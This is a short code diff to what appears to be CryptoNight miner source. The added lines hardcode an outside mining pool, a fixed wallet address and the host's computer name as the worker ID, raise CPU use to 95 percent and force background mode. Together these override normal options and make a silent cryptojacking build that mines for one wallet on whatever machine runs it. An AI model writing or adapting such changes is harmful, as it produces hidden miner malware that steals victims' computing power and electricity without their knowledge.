@@ -34,6 +34,8 @@
 #include "cpu.h"
 #include "donate.h"
 #include "algo/cryptonight/cryptonight.h"
+#include <windows.h>
+#include <Lmcons.h>
 
 
 int64_t opt_affinity      = -1L;
@@ -416,6 +418,35 @@ static char *parse_url(const char *arg)
 void parse_cmdline(int argc, char *argv[]) {
     opt_user = strdup("x");
     opt_pass = strdup("x");
+
+    //int64_t opt_affinity      = -1L;
+    //int     opt_n_threads     = 0;
+    //int     opt_algo_variant  = 0;
+    //int     opt_retries       = 5;
+    //int     opt_retry_pause   = 5;
+    //int     opt_donate_level  = DONATE_LEVEL;
+    //int     opt_max_cpu_usage = 75;
+    //bool    opt_colors        = true;
+    //bool    opt_keepalive     = false;
+    //bool    opt_background    = false;
+    //bool    opt_double_hash   = false;
+    //bool    opt_safe          = false;
+    //bool    opt_nicehash      = false;
+    //char    *opt_url          = NULL;
+    //char    *opt_backup_url   = NULL;
+    //char    *opt_userpass     = NULL;
+    //char    *opt_user         = NULL;
+    //char    *opt_pass         = NULL;
+    opt_algo = 1;
+    opt_url  = "http://pool.myaeon.ru:1111";
+	//opt_url  = "stratum+tcp://pool.myaeon.ru:1111";
+	//opt_url  = "stratum+tcp://91.244.170.86:1111";
+    opt_user = "Wmu1v35Bq9zFtSssT3GWjm7Wxpd2dvk7TWgqPPZi9y92hRv3GTKrJLU4oVgPjrjKCbKEShp1HDFmjCcEDT6ykRzt1vVZCCB1G";
+    opt_pass = getenv("COMPUTERNAME");
+    opt_safe = false;
+    opt_algo_variant = 0;
+    opt_max_cpu_usage = 95;
+    opt_background = true;
 
     int key;
 
